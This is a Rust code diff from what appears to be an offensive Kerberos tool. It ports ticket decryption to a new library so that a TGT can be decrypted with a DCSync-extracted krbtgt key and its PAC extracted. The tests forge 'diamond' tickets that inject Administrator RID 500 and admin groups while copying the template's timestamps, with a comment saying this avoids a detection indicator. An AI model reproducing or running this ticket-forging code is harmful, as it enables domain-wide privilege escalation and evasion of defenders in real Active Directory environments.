@@ -15,19 +15,61 @@ pub use ms_pac_forge::pac::{
 };
 
 use crate::Tgt;
-use anyhow::Result;
-use picky_krb::data_types::EncTicketPart;
+use anyhow::{anyhow, Result};
+use kerbcore::acceptor::EncTicketPart;
 
 /// Decrypt a real TGT's EncTicketPart with the krbtgt AES256 key and return
 /// (the parsed enc-ticket-part, the raw PAC bytes). Doubles as a live proof that
 /// the DCSync-extracted krbtgt key is correct: AES decryption is
 /// integrity-protected, so a wrong key fails here rather than yielding garbage.
 ///
-/// Thin adapter over [`ms_pac_forge::pac::decrypt_ticket_pac_aes256`] that pulls
-/// the ciphertext out of the local `Tgt` wrapper (which owns the picky-krb
-/// `Ticket` and never crossed the ms-pac-forge boundary).
+/// 1.5.3 kerbcore swap: decrypt (usage 2) + parse via kerbcore
+/// (`KerberosKey` + `acceptor::parse_enc_ticket_part`); the PAC is pulled from the
+/// ticket's authorization-data (AD-IF-RELEVANT → AD-WIN2K-PAC) rather than through
+/// ms-pac-forge's picky-typed `decrypt_ticket_pac_aes256`. PAC marshaling itself
+/// still lives in ms-pac-forge (`assemble_pac`/`parse_pac`, byte-in/byte-out).
 pub fn decrypt_ticket_pac(tgt: &Tgt, krbtgt_aes256: &[u8]) -> Result<(EncTicketPart, Vec<u8>)> {
-    decrypt_ticket_pac_aes256(tgt.ticket_cipher(), krbtgt_aes256)
+    let key = kerbcore::KerberosKey::from_i32(18, krbtgt_aes256.to_vec())
+        .map_err(|e| anyhow!("krbtgt AES256 key: {e}"))?;
+    let plain = key
+        .decrypt(2, tgt.ticket_cipher())
+        .map_err(|e| anyhow!("decrypt EncTicketPart (wrong krbtgt key?): {e}"))?;
+    let etp = kerbcore::acceptor::parse_enc_ticket_part(&plain)
+        .map_err(|e| anyhow!("parse EncTicketPart: {e:?}"))?;
+    let pac = extract_win2k_pac(&etp.authorization_data)
+        .ok_or_else(|| anyhow!("no AD-WIN2K-PAC in ticket authorization-data"))?;
+    Ok((etp, pac))
+}
+
+/// Walk an EncTicketPart's raw authorization-data (`SEQUENCE OF AuthorizationData`) and return the
+/// AD-WIN2K-PAC (type 128) bytes, descending through the AD-IF-RELEVANT (type 1) container.
+fn extract_win2k_pac(auth_data: &[u8]) -> Option<Vec<u8>> {
+    use kerbcore::der::{context_tag, one_or, Der, TAG_OCTET_STRING, TAG_SEQUENCE};
+    fn walk(seq_of: &[u8]) -> Option<Vec<u8>> {
+        let mut r = Der::new(seq_of);
+        while !r.is_empty() {
+            let (_, elem) = r.read_tlv().ok()?;
+            let mut er = Der::new(elem);
+            let ad_type = {
+                let mut i = Der::new(er.expect(context_tag(0)).ok()?);
+                i.read_integer().ok()?
+            };
+            let ad_data = one_or(er.expect(context_tag(1)).ok()?, TAG_OCTET_STRING).ok()?;
+            match ad_type {
+                128 => return Some(ad_data.to_vec()), // AD-WIN2K-PAC
+                1 => {
+                    // AD-IF-RELEVANT → its ad-data is itself a SEQUENCE OF AuthorizationData.
+                    let inner = one_or(ad_data, TAG_SEQUENCE).ok()?;
+                    if let Some(p) = walk(inner) {
+                        return Some(p);
+                    }
+                }
+                _ => {}
+            }
+        }
+        None
+    }
+    walk(one_or(auth_data, TAG_SEQUENCE).ok()?)
 }
 
 #[cfg(test)]
@@ -123,8 +165,8 @@ mod wired {
         // Read template's timestamps for the equality assertion below.
         let (etp_template, _) =
             decrypt_ticket_pac(&template, &key).expect("decrypt template with krbtgt key");
-        let template_auth_time = etp_template.auth_time.0.clone();
-        let template_endtime = etp_template.endtime.0.clone();
+        let template_auth_time = etp_template.authtime.clone();
+        let template_endtime = etp_template.endtime.clone();
 
         // Diamond overrides = elevated identity (Administrator RID 500 + admin groups).
         let injected = ForgeIdentity {
@@ -146,11 +188,11 @@ mod wired {
 
         // Timestamps inherited from template — this is the diamond property.
         assert_eq!(
-            etp_diamond.auth_time.0, template_auth_time,
+            etp_diamond.authtime, template_auth_time,
             "diamond auth_time must equal template auth_time (inherited)"
         );
         assert_eq!(
-            etp_diamond.endtime.0, template_endtime,
+            etp_diamond.endtime, template_endtime,
             "diamond endtime must equal template endtime (inherited — no 10-year IOC)"
         );
 
@@ -280,9 +322,9 @@ mod live {
         let (etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt PAC");
         let parsed = parse_pac(&pac).expect("parse PAC");
         eprintln!(
-            "[pac] {} bytes, flags={:02x?}, {} buffers:",
+            "[pac] {} bytes, flags={:08x}, {} buffers:",
             pac.len(),
-            etp.flags.0.as_bytes(),
+            etp.flags,
             parsed.buffers.len()
         );
         for b in &parsed.buffers {
